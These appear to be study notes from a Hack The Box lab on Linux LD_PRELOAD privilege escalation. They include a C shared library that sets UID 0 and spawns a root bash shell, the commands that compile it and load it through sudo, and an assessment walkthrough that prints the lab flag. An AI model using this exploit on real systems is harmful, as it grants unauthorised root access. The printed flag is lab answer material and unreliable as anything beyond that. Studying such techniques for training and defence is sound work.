# Shared Libraries

Two types of libraries exist in Linux:

* `static libraries` (denoted by the .a file extension)
* `dynamically linked shared object libraries` (denoted by the .so file extension)

When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

Methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

lists all the libraries required by `/bin/ls`, along with their absolute paths.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

### LD\_PRELOAD Privilege Escalation

Example of how we can utilize the [LD\_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld\_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

* user has rights to restart apache service as root (not in gtfobins)
* `/etc/sudoers` entry is written specifying the absolute path
* We can exploit the `LD_PRELOAD` issue to run a custom shared library file.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile this as follows:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## Assessment

Escalate privileges using LD\_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld\_preload directory.

```bash
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
htb-student@NIX02:~$ ldd /usr/bin/openssl
        linux-vdso.so.1 =>  (0x00007fff6df45000)
        libssl.so.1.0.0 => /lib/x86_64-linux-gnu/libssl.so.1.0.0 (0x00007f6a919f2000)
        libcrypto.so.1.0.0 => /lib/x86_64-linux-gnu/libcrypto.so.1.0.0 (0x00007f6a915ae000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6a911e4000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f6a90fe0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6a91c5b000)

```

```bash
htb-student@NIX02:~$ cat lib.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
htb-student@NIX02:~$ gcc -fPIC -shared -o lib.so lib.c -nostartfiles
```

```bash
htb-student@NIX02:~$ pwd
/home/htb-student
htb-student@NIX02:~$ sudo LD_PRELOAD=/home/htb-student/lib.so /usr/bin/openssl
root@NIX02:~# ls
lib.c  lib.so  lynis-master  master.zip  shared_obj_hijack
root@NIX02:~# cat /root/ld_preload/flag.txt 
6a9c151a599135618b8f09adc78ab5f1
root@NIX02:~#
```
